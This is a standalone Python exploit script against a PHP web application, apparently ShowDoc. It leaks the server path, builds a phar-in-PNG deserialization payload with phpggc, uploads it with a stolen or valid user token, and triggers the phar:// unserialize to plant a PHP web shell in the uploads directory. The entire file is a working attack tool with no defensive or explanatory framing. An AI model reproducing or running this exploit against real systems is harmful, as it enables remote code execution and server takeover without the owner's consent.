import requests
import json
import re
import subprocess
import sys
from urllib.parse import urlparse

def get_absolute_path(url):
    u = url + "/server/index.php?s=xx/xx/xx"
    resp = requests.get(u).text
    pattern = r"(\\/[\w\\/.]+)\\/server"
    matche = re.findall(pattern, resp)[0].replace("\\","")
    print("[+]get absolute path: "+matche)
    return matche

def get_path_and_query(url):
    parsed_url = urlparse(url)
    path = parsed_url.path
    query = parsed_url.query
    path_and_query = f"{path}?{query}" if query else path
    return path_and_query

def upload(token):
    url_upload = url + "/server/index.php?s=/api/page/uploadImg&user_token="+token
    with open("phar.png", 'rb') as img:
        files = {'editormd-image-file': img}
        response = requests.post(url_upload, files=files)
        sign_url = json.loads(response.text)
        return get_path_and_query(sign_url['url'])


def get_path(sign):
    url_path = url +sign
    response = requests.get(url_path, allow_redirects=False)
    if response.status_code == 302:
        redirect_url = response.headers.get('Location')
        return get_path_and_query(redirect_url)
    else:
        return None

def get_phar(apath="/var/www/html", rshellname="shell.php",lshellpath="shell.php"):
    cmd = "phpggc Guzzle/FW1 " + "\"" + apath +"/Public/Uploads/"+ rshellname + "\"" + " ./" + lshellpath + " -p phar -pp ./gif -o phar.png"
    subprocess.Popen(cmd,shell=True).wait()
    return

def phar(path,apath,rshellname,url):
    url_path = url + "/server/index.php?s=/home/index/new_is_writeable"
    data  = {"file":"phar://"+apath+path}
    requests.post(url_path,data=
                       data)
    r = requests.get(url+"/Public/Uploads/"+rshellname)
    if r.status_code == 200:
        print("[+] unserialize success! shell path is: "+url+"/Public/Uploads/"+rshellname)

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("[+] usage: python3 unser.py http://target rshell.php shell.php xxxxxxx-token-xxxx")
        sys.exit()
    # 目标URL
    url = sys.argv[1]
    # 远程shell文件名
    rshellname = sys.argv[2]
    # 本地shell文件名
    lshellpath = sys.argv[3]
    # 用户token
    token = sys.argv[4]
    apath = get_absolute_path(url)
    get_phar(apath, rshellname, lshellpath)
    sign_url = upload(token)
    phar_path = get_path(sign_url)
    phar(phar_path,apath,rshellname,url)


